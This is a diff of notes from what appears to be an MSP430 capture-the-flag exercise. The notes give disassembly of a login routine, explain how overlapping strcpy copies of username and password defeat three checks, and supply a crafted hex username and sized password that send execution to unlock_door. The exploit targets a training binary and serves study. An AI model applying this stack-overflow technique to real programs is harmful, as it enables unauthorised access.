@@ -825,13 +825,33 @@ fff0:   4644 4644 4644 4644   FDFDFDFD
 fff8:   4644 4644 4644 0044   FDFDFD.D
 
 
-Code only checks for password
-You control password length @ 44cc
-	45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
-	==43b4
-	45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
-	==43b3
+Username and password can overlap eachother when copied to the stack
+Code has three arbitrary checks
+	0:
+		45e4:  5f44 e8ff      mov.b	-0x18(r4), r15 //==43b4
+		45ea:  0b9f           cmp	r15, r11
+		45ec:  0628           jnc	#0x45fa <login+0xaa>
+	Controlled from the username by entering a value less than the password length
+	1:
+		45fa:  5f44 e7ff      mov.b	-0x19(r4), r15 //==43b3
+		4600:  0b9f           cmp	r15, r11
+		4602:  062c           jc	#0x4610 <login+0xc0>
+	Controlled from the username by entering a value equal to the password length
+	2:
+		464c:  c493 faff      tst.b	-0x6(r4)
+		4650:  0624           jz	#0x465e <login+0x10e>
+	This byte must be zero and has to be controlled via the password. Entering a 
+		null byte in the username will cause strcpy to stop at that byte.
+		Luckly, strcpy will place a null byte as the terminating character at the end
+		of a string, allowing us to use the password to control this byte.
 
-
-4141414141414141414141414141414141111241414141414141414141414141414141410641414141414a44
-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Username:
+	4141414141414141414141414141414141111241414141414141414141414141414141414141414141414a44
+					 ^^						    ^
+					 ||						    |
+      len(password)-1 to satisfy jnc @45ec|					addr unlock_door
+	  len(password) to satisfy jc @4602
+Password:
+	BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+	Length crafted to place null term char @ addr to satisfy jz @4650
+^^^ 
